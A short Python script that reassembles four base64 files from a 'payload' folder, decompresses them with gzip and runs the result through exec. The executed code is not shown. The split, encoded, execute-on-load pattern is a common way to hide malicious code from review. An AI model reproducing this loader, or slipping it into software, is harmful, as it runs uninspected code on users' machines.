from pathlib import Path
from base64 import b64decode
from gzip import decompress

root = Path(__file__).resolve().parent
payload = ''.join((root / 'payload' / f'part{i}.b64').read_text().strip() for i in range(1, 5))
source = decompress(b64decode(payload))
exec(compile(source, 'nar_beta_v491_payload.py', 'exec'))
